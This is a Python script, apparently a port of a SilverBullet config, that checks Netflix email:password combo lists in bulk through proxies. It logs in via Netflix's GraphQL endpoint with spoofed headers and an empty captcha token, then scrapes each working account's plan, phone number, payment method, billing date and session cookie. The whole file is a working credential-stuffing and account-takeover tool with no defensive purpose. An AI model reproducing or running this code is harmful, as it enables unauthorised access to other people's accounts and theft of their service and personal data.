"""
Netflix mail:pass checker — ported from NFLIX3.svb SilverBullet config.
Flow:
  1. GET geolocation → detect country
  2. GET /login page → extract cookies + session tokens
  3. POST GraphQL CLCSScreenUpdate → login with email/password
  4. If success → GET /account → capture plan, payment, profiles, etc.
"""

import aiohttp
import asyncio
import re
import random
import time
from typing import Dict, Optional, Tuple, List

USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1",
]

DESKTOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0"

# Country code → phone dial code (from .svb Translate block)
COUNTRY_CODES = {
    "AF":"93","AL":"355","DZ":"213","AS":"1684","AD":"376","AO":"244","AI":"1264",
    "AG":"1268","AR":"54","AM":"374","AW":"297","AU":"61","AT":"43","AZ":"994",
    "BS":"1242","BH":"973","BD":"880","BB":"1246","BY":"375","BE":"32","BZ":"501",
    "BJ":"229","BM":"1441","BT":"975","BO":"591","BA":"387","BW":"267","BR":"55",
    "IO":"246","BN":"673","BG":"359","BF":"226","BI":"257","KH":"855","CM":"237",
    "CA":"1","CV":"238","KY":"1345","CF":"236","TD":"235","CL":"56","CN":"86",
    "CX":"61","CC":"61","CO":"57","KM":"269","CG":"242","CK":"682","CR":"506",
    "CI":"225","HR":"385","CU":"53","CY":"357","CZ":"420","DK":"45","DJ":"253",
    "DM":"1767","DO":"1809","EC":"593","EG":"20","SV":"503","GQ":"240","ER":"291",
    "EE":"372","ET":"251","FK":"500","FO":"298","FJ":"679","FI":"358","FR":"33",
    "GF":"594","PF":"689","GA":"241","GM":"220","GE":"995","DE":"49","GH":"233",
    "GI":"350","GR":"30","GL":"299","GD":"1473","GP":"590","GU":"1671","GT":"502",
    "GN":"224","GW":"245","GY":"592","HT":"509","HN":"504","HK":"852","HU":"36",
    "IS":"354","IN":"91","ID":"62","IR":"98","IQ":"964","IE":"353","IL":"972",
    "IT":"39","JM":"1876","JP":"81","JO":"962","KZ":"7","KE":"254","KI":"686",
    "KR":"82","KP":"850","KW":"965","KG":"996","LA":"856","LV":"371","LB":"961",
    "LS":"266","LR":"231","LY":"218","LI":"423","LT":"370","LU":"352","MO":"853",
    "MK":"389","MG":"261","MW":"265","MY":"60","MV":"960","ML":"223","MT":"356",
    "MH":"692","MQ":"596","MR":"222","MU":"230","YT":"262","MX":"52","FM":"691",
    "MD":"373","MC":"377","MN":"976","ME":"382","MS":"1664","MA":"212","MZ":"258",
    "MM":"95","NA":"264","NR":"674","NP":"977","NL":"31","NC":"687","NZ":"64",
    "NI":"505","NE":"227","NG":"234","NU":"683","NF":"672","MP":"1670","NO":"47",
    "OM":"968","PK":"92","PW":"680","PA":"507","PG":"675","PY":"595","PE":"51",
    "PH":"63","PN":"64","PL":"48","PT":"351","PR":"1787","QA":"974","RE":"262",
    "RO":"40","RU":"7","RW":"250","SH":"290","KN":"1869","LC":"1758","PM":"508",
    "VC":"1784","WS":"685","SM":"378","ST":"239","SA":"966","SN":"221","RS":"381",
    "SC":"248","SL":"232","SG":"65","SK":"421","SI":"386","SB":"677","SO":"252",
    "ZA":"27","ES":"34","LK":"94","SD":"249","SR":"597","SJ":"47","SZ":"268",
    "SE":"46","CH":"41","SY":"963","TW":"886","TJ":"992","TZ":"255","TH":"66",
    "TG":"228","TK":"690","TO":"676","TT":"1868","TN":"216","TR":"90","TM":"993",
    "TC":"1649","TV":"688","UG":"256","UA":"380","AE":"971","GB":"44","US":"1",
    "UY":"598","UZ":"998","VU":"678","VA":"39","VE":"58","VN":"84","VG":"1284",
    "VI":"1340","WF":"681","YE":"967","ZM":"260","ZW":"263",
}


def _parse_lr(text: str, left: str, right: str) -> Optional[str]:
    """Extract string between left and right delimiters (like SB LR parse)."""
    try:
        if left:
            idx = text.index(left)
            text = text[idx + len(left):]
        if right:
            idx = text.index(right)
            text = text[:idx]
        return text
    except (ValueError, IndexError):
        return None


async def _make_request(session, method, url, **kwargs):
    """Simple request wrapper with timeout."""
    timeout = aiohttp.ClientTimeout(total=kwargs.pop('timeout', 30))
    try:
        async with session.request(method, url, timeout=timeout, **kwargs) as resp:
            text = await resp.text()
            cookies = {k: v.value for k, v in resp.cookies.items()}
            return text, resp.status, cookies, dict(resp.headers)
    except Exception as ex:
        return None, 0, {}, {}


async def check_netflix_account(email: str, password: str, proxy: str = None) -> Dict:
    """
    Check a single Netflix email:password combo.
    Returns dict with status and captures.
    """
    result = {
        'user': email,
        'password': password,
        'status': 'fail',
        'captures': {},
        'detail': '',
    }

    connector = None
    proxy_url = None
    if proxy:
        proxy_url = proxy if proxy.startswith('http') else f'http://{proxy}'

    jar = aiohttp.CookieJar(unsafe=True)
    async with aiohttp.ClientSession(cookie_jar=jar) as session:
        # Step 1: Geolocation
        geo_headers = {
            "Host": "geolocation.onetrust.com",
            "Connection": "keep-alive",
            "User-Agent": DESKTOP_UA,
            "accept": "application/json",
            "Origin": "https://www.netflix.com",
            "Referer": "https://www.netflix.com/",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
        }
        geo_text, geo_status, _, _ = await _make_request(
            session, "GET",
            "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location",
            headers=geo_headers, proxy=proxy_url
        )
        if not geo_text:
            result['detail'] = 'Geo request failed'
            return result

        country = _parse_lr(geo_text, '"country":"', '",') or 'US'
        country_lower = country.lower()
        country_upper = country.upper()
        dial_code = COUNTRY_CODES.get(country_upper, '1')
        en_big = f"en-{country_lower}"
        en_upper = f"en-{country_upper}"

        # Step 2: GET login page → extract cookies + tokens
        mobile_ua = random.choice(USER_AGENTS)
        login_headers = {
            "Host": "www.netflix.com",
            "Sec-Fetch-Dest": "document",
            "User-Agent": mobile_ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Accept-Language": "en-GB,en;q=0.9",
            "Priority": "u=0, i",
            "Accept-Encoding": "gzip, deflate, br",
        }
        login_text, login_status, login_cookies, _ = await _make_request(
            session, "GET",
            f"https://www.netflix.com/{country_lower}/login",
            headers=login_headers, proxy=proxy_url
        )
        if not login_text:
            result['detail'] = 'Login page failed'
            return result

        ui_version = _parse_lr(login_text, '{"X-Netflix.uiVersion":"', '",') or ''
        client_type = _parse_lr(login_text, '"X-Netflix.clientType":"', '"}}}') or ''
        preferred_locale = _parse_lr(login_text, '"preferredLocale":{"id":"', '",') or en_big
        clcs_session_id = _parse_lr(login_text, '\\"clcsSessionId\\":\\"', '",') or ''
        referrer_rendition_id = _parse_lr(login_text, '\\"referrerRenditionId\\":\\"', '"}') or ''

        # Step 3: POST GraphQL login
        payload = {
            "operationName": "CLCSScreenUpdate",
            "variables": {
                "format": "HTML",
                "imageFormat": "PNG",
                "locale": preferred_locale,
                "serverState": (
                    '{"realm":"growth","name":"PASSWORD_LOGIN","clcsSessionId":"'
                    + clcs_session_id
                    + '","sessionContext":{"session-breadcrumbs":{"funnel_name":"loginWeb"},'
                    '"emailRegisterLinkSent.manageResendToast":{"showToast":false},'
                    '"login.navigationSettings":{"hideOtpToggle":true}}}'
                ),
                "serverScreenUpdate": (
                    '{"realm":"custom","name":"growthLoginByPassword",'
                    '"metadata":{"recaptchaSiteKey":"6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR"},'
                    '"loggingAction":"Submitted","loggingCommand":"SubmitCommand",'
                    '"referrerRenditionId":"' + referrer_rendition_id + '"}'
                ),
                "inputFields": [
                    {"name": "password", "value": {"stringValue": password}},
                    {"name": "userLoginId", "value": {"stringValue": email}},
                    {"name": "countryCode", "value": {"stringValue": dial_code}},
                    {"name": "countryIsoCode", "value": {"stringValue": country_lower}},
                    {"name": "recaptchaResponseTime", "value": {"intValue": random.randint(300, 600)}},
                    {"name": "recaptchaResponseToken", "value": {"stringValue": ""}},
                ],
            },
            "extensions": {
                "persistedQuery": {
                    "id": "99afa95c-aa4e-4a8a-aecd-19ed486822af",
                    "version": 102,
                }
            },
        }

        gql_headers = {
            "Host": "web.prod.cloud.netflix.com",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Connection": "keep-alive",
            "Origin": "https://www.netflix.com",
            "Referer": "https://www.netflix.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": mobile_ua,
            "accept": "*/*",
            "accept-language": en_big,
            "content-type": "application/json",
            "sec-ch-ua": '"Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "x-netflix.context.app-version": ui_version,
            "x-netflix.context.hawkins-version": "5.12.1",
            "x-netflix.context.locales": en_upper,
            "x-netflix.context.operation-name": "CLCSScreenUpdate",
            "x-netflix.context.ui-flavor": client_type,
            "x-netflix.request.attempt": "1",
            "x-netflix.request.clcs.bucket": "high",
            "x-netflix.request.client.context": '{"appstate":"foreground"}',
            "x-netflix.request.id": f"{random.randint(10**31, 10**32-1):032x}",
            "x-netflix.request.toplevel.uuid": f"{random.randint(10**31, 10**32-1):08x}-{random.randint(0,0xffff):04x}-{random.randint(0,0xffff):04x}-{random.randint(0,0xffff):04x}-{random.randint(10**11,10**12-1):012x}",
        }

        import json as _json
        gql_text, gql_status, gql_cookies, _ = await _make_request(
            session, "POST",
            "https://web.prod.cloud.netflix.com/graphql",
            json=payload, headers=gql_headers, proxy=proxy_url
        )
        if not gql_text:
            result['detail'] = 'GraphQL request failed'
            return result

        # Key checks (from .svb KEYCHECK)
        if any(k in gql_text for k in [
            "Incorrect password. You can get a rejoin link",
            "Incorrect password. You can get a rejoin link, or check your info and try again.",
        ]):
            result['status'] = 'fail'
            result['detail'] = 'Incorrect password'
            return result

        if any(k in gql_text for k in [
            "Welcome back,", "PLAN_SELECTION_CONTEXT", "PLAN_SELECTION",
        ]):
            result['status'] = 'expired'
            result['detail'] = 'Account expired / needs plan selection'
            result['captures']['status'] = 'Expired'
            return result

        if any(k in gql_text for k in [
            "PERMISSION_DENIED", "Access is denied for passport",
        ]):
            result['status'] = 'retry'
            result['detail'] = 'Permission denied / rate limited'
            return result

        is_success = any(k in gql_text for k in [
            'Navigating to /browse\\', '"universal":"/browse',
        ])

        if not is_success:
            result['status'] = 'fail'
            result['detail'] = 'Unknown login response'
            return result

        # Step 4: GET /account to capture details
        account_headers = {
            "Host": "www.netflix.com",
            "Connection": "keep-alive",
            "sec-ch-ua": '"Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": DESKTOP_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
        }

        acct_text, acct_status, acct_cookies, _ = await _make_request(
            session, "GET",
            "https://www.netflix.com/account",
            headers=account_headers, proxy=proxy_url
        )

        if not acct_text:
            # Login worked but couldn't fetch account page
            result['status'] = 'hit'
            result['detail'] = 'Login OK, account page failed'
            return result

        # Parse captures (exact same fields as .svb)
        caps = result['captures']

        profile_raw = _parse_lr(acct_text, '"profileInfo":{"profileName":"', '"')
        if profile_raw:
            caps['Profile'] = profile_raw.replace('\\x20', ' ')

        phone = _parse_lr(acct_text, '"phoneNumberDigits":{"__typename":"GrowthClearStringValue","value":"', '"}')
        if phone:
            caps['Phone'] = phone

        member_since_raw = _parse_lr(acct_text, '"memberSince":{"fieldType":"Numeric","value":', '}')
        if member_since_raw:
            try:
                ts = int(member_since_raw.strip())
                from datetime import datetime
                caps['MemberSince'] = datetime.utcfromtimestamp(ts / 1000).strftime('%Y-%m-%d')
            except:
                caps['MemberSince'] = member_since_raw.strip()

        c = _parse_lr(acct_text, '"currentCountry":"', '"')
        if c:
            caps['Country'] = c

        plan = _parse_lr(acct_text, '"localizedPlanName":{"fieldType":"String","value":"', '"}')
        if plan:
            caps['Plan'] = plan

        streams = _parse_lr(acct_text, '"maxStreams":{"fieldType":"Numeric","value":', '}')
        if streams:
            caps['Screens'] = streams.strip()

        vq = _parse_lr(acct_text, '"videoQuality":{"fieldType":"String","value":"', '"}')
        if vq:
            caps['Quality'] = vq

        price_raw = _parse_lr(acct_text, '"planPrice":{"fieldType":"String","value":"', '"}')
        if price_raw:
            caps['Price'] = price_raw

        pm = _parse_lr(acct_text, '"paymentMethod":{"fieldType":"String","value":"', '"}')
        if pm:
            caps['Payment'] = pm

        nbd = _parse_lr(acct_text, '"nextBillingDate":{"fieldType":"String","value":"', '"}')
        if nbd:
            caps['NextBill'] = nbd.replace('\\x20', '-')

        extra = _parse_lr(acct_text, '"showExtraMemberSection":{"fieldType":"Boolean","value":', '}')
        if extra:
            caps['ExtraMember'] = extra.strip()

        # Final membership check
        if any(k in acct_text for k in ['"membershipStatus":"CURRENT_MEMBER', '"CURRENT_MEMBER":true,']):
            result['status'] = 'hit'
        elif any(k in acct_text for k in [
            '"membershipStatus":"FORMER_MEMBER',
            '"membershipStatus":"NEVER_MEMBER',
            '"ANONYMOUS":true,',
            '"FORMER_MEMBER":true,',
        ]):
            result['status'] = 'custom'
            result['detail'] = 'Former/Never member'
        else:
            result['status'] = 'hit'

        # Grab Netflix cookie for captures
        netflix_cookie = None
        for cookie in session.cookie_jar:
            if cookie.key == 'NetflixId':
                netflix_cookie = cookie.value
                break
        if netflix_cookie:
            caps['Cookie'] = netflix_cookie

    return result


async def check_netflix_accounts(
    credentials: List[str],
    max_concurrent: int = 10,
    on_progress=None,
    stop_event=None,
    proxy: str = None,
) -> List[Dict]:
    """
    Batch check Netflix mail:pass combos.
    credentials: list of "email:password" strings
    """
    sem = asyncio.Semaphore(max_concurrent)
    results = []
    done_count = [0]
    total = len(credentials)

    async def _check_one(cred: str):
        if stop_event and stop_event.is_set():
            return
        parts = cred.split(':', 1)
        if len(parts) != 2:
            return
        email, password = parts[0].strip(), parts[1].strip()
        async with sem:
            if stop_event and stop_event.is_set():
                return
            try:
                r = await check_netflix_account(email, password, proxy=proxy)
            except Exception as ex:
                r = {'user': email, 'password': password, 'status': 'fail', 'captures': {}, 'detail': str(ex)}
            results.append(r)
            done_count[0] += 1
            if on_progress:
                on_progress(done_count[0], total)

    tasks = [_check_one(c) for c in credentials]
    await asyncio.gather(*tasks)
    return results
